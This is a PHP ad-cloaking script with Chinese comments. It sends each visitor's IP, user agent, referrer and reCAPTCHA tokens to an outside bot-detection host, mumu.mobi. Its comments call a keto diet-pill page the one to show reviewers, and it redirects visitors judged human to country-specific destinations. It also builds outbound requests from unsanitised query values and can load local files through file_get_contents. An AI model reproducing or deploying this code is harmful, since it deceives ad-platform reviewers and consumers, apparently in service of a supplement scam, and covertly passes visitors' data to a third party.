<?php
    //配置，根据国家设置真实页面的网址, 写法是直接网址，或者写文件目录，写网址直接跳转，写目录就加载网页
    $country = array(
        'FR'=>'https://google.com',
        'DE'=>'https://google.com'

    );
    //审核页面的网址, 写法是直接网址，或者写文件目录，写网址直接跳转，写目录就加载网页
    $fakePage = "https://keto1500advanced.netlify.app/crane-keto-1500-advanced/";
    //回调网页收集数据的网址
    $callbackUrl = "http://127.0.0.1";
    //这些代码别碰
    function startsWith ($string, $startString)
    {
        $len = strlen($startString);
        return (substr($string, 0, $len) === $startString);
    }

    function callback($url,$data){
        $u = str_replace("[[GEO]]", $data->country, $url);
        $u = str_replace("[[ISP]]", urlencode($data->isp), $u);
        $u = str_replace("[[BOT]]", $data->is_bot, $u);
        if(isset($_GET['gclid'])){
            $u = str_replace("[[GCLID]]", $_GET['gclid'], $u);
        }
        file_get_contents($u);
    }

    function redirectPage($url){
        if(startsWith($url,"http")){
            //redirect
            echo "window.location.href='".$url."';";
            exit;
        }else{
            //load
            $data = file_get_contents($url);
            echo $data;
        }
    }
    //robot check
    $addr = "http://www.mumu.mobi:8443/pixel";
    $addrv3 = "http://www.mumu.mobi:8443/gv3";
    //$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    $jData = array(
        'user_agent' => isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:"", 
        'addr' => "", 
        'referral' => urldecode($_GET['ref']), 
        'req_url' => urldecode($_GET['requrl']), 
        'proxy_addr' => "", 
        'ct' => "google", 
    );
    $jV3 = array(
        "secret"=>isset($_GET["sec"])?$_GET["sec"]:"",
        "response"=>isset($_GET["resp"])?$_GET["resp"]:"",
        );
    //get real ip
    if(isset($_SERVER["HTTP_CF_CONNECTING_IP"])){
        $jData['addr']=$_SERVER["HTTP_CF_CONNECTING_IP"];
        $jData['proxy_addr']=$_SERVER['REMOTE_ADDR'];
    }else{
        $jData['addr']=$_SERVER['REMOTE_ADDR'];
    }
    //var_dump($jData);
    //make curl request
    $data = json_encode($jData);

    $ch = curl_init($addr);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $ret = curl_exec($ch);
    //var_dump($ret);
    $jResp = json_decode($ret);
    curl_close($ch);
    //var_dump($jData);
    //var_dump($jResp);
    //exit();
    //google recaptcha v3 check
    $dv3 = json_encode($jV3);
    $chv3 = curl_init($addrv3);
    curl_setopt($chv3, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($chv3, CURLOPT_POSTFIELDS, $dv3);
    curl_setopt($chv3, CURLOPT_RETURNTRANSFER, true);
    $dret = curl_exec($chv3);
    $jDResp = json_decode($dret);
    
    if(isset($jDResp->is_bot)){
        if ($jDResp->is_bot){
            die();
        }
    }

    if(isset($jResp->is_bot)){
        callback($callbackUrl,$jResp);
        if($jResp->is_bot){
            //load bot page
            //redirectPage($fakePage);
        }else{
            //real user
            foreach ($country as $key => $value) {
                if(strcasecmp($key, $jResp->country)==0 && strlen($jResp->country)>0){
                    redirectPage($value);
                    break;
                }
            }
        }
    }
    exit();
?>